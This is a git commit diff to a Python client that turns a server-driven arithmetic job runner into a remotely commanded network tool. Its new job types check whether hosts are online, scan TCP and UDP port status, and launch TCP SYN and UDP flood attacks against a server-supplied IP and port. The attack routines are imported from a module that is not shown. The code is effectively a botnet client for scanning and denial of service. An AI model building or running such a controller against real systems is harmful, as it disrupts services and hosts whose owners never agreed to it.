4d3c39a466dae0e1d3c58f0e5ee124e6ef266f9b
singh1o2 <58059441+singh1o2@users.noreply.github.com>
2020-11-30 23:34:47 -0500

    Update client.py

--- client.py
+++ client.py
@@ -2,9 +2,10 @@ from socket import *
 import pickle
 import sys
 from data import *
+from status import *
+from attack import *
 
-
-serverSocket = socket(AF_INET,SOCK_STREAM)
+serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 serverSocket.connect(('127.0.0.1',80))
 
 control = ['ASK']
@@ -12,24 +13,29 @@ status = ['JOB_COMPLETED']
 
 def response(serverSocket,msgRecv):
     jobType = msgRecv.jobType
-    numberOne = msgRecv.jobData[0]
-    numberTwo = msgRecv.jobData[1]
-    if jobType == 'ADD':
-        x = clientData(status[0],str(numberOne+numberTwo))
+    IP = msgRecv.jobData[0]
+
+    if jobType == 'IS_HOST_ONLINE':
+        x = clientData(status[0],isOnline(IP))
         x.msgSize = sys.getsizeof(pickle.dumps(x));
         serverSocket.send(pickle.dumps(x))
-    elif jobType == 'SUBSTRACT':
-        x = clientData(status[0],str(numberOne-numberTwo))
-        x.msgSize = sys.getsizeof(pickle.dumps(x));
+    elif jobType == 'PORT_STATUS':
+        port = msgRecv.jobData[1]
+        x = clientData(status[0],[tcpPortStatus(IP,int(port)),udpPortStatus(IP,int(port))])
+        x.msgSize = sys.getsizeof(pickle.dumps(x))
         serverSocket.send(pickle.dumps(x))
-    elif  jobType == 'MULTIPLY':
-        x = clientData(status[0],str(numberOne*numberTwo))
-        x.msgSize = sys.getsizeof(pickle.dumps(x));
+    elif  jobType == 'TCP_ATTACK':
+        port = int(msgRecv.jobData[1])
+        x = clientData(status[0],str('TCP_ATTACK INITIATED'))
+        x.msgSize = sys.getsizeof(pickle.dumps(x))
         serverSocket.send(pickle.dumps(x))
-    elif jobType == 'DIVIDE':
-        x = clientData(status[0],str(numberOne/numberTwo))
-        x.msgSize = sys.getsizeof(pickle.dumps(x));
+        tcpSyn(IP,port)
+    elif jobType == 'UDP_ATTACK':
+        port = int(msgRecv.jobData[1])
+        x = clientData(status[0],str('UDP_ATTACK INITIATED'))
+        x.msgSize = sys.getsizeof(pickle.dumps(x))
         serverSocket.send(pickle.dumps(x))
+        udpAttack(IP,port)
 
 
 x = clientData(control[0],'')
